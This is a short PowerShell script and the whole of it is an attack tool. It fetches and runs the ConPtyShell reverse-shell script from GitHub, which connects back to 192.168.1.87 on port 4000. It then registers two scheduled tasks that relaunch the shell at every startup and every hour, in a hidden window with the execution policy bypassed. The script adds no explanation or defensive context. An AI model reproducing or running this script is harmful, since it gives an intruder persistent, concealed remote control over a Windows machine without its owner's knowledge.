# The PowerShell command you want to run
$command = 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.87 4000'

# Run the command immediately
Invoke-Expression $command

# Create a Scheduled Task to run at system startup
$startupTaskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command & {$command}"
$startupTaskTrigger = New-ScheduledTaskTrigger -AtStartup
$startupTask = New-ScheduledTask -Action $startupTaskAction -Trigger $startupTaskTrigger -Description "Run ConPtyShell at startup"
Register-ScheduledTask -TaskName "RunConPtyShellAtStartup" -InputObject $startupTask

# Create a Scheduled Task to run every hour
$hourlyTaskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command & {$command}"
$hourlyTaskTrigger = New-ScheduledTaskTrigger -Daily -At "00:00"  # Starting at midnight
$hourlyTaskTrigger.RepetitionInterval = (New-TimeSpan -Hours 1)  # Run every hour
$hourlyTaskTrigger.RepetitionDuration = (New-TimeSpan -Days 1)  # Repeat for 24 hours
$hourlyTask = New-ScheduledTask -Action $hourlyTaskAction -Trigger $hourlyTaskTrigger -Description "Run ConPtyShell every hour"
Register-ScheduledTask -TaskName "RunConPtyShellEveryHour" -InputObject $hourlyTask

Write-Host "Scheduled tasks created successfully."
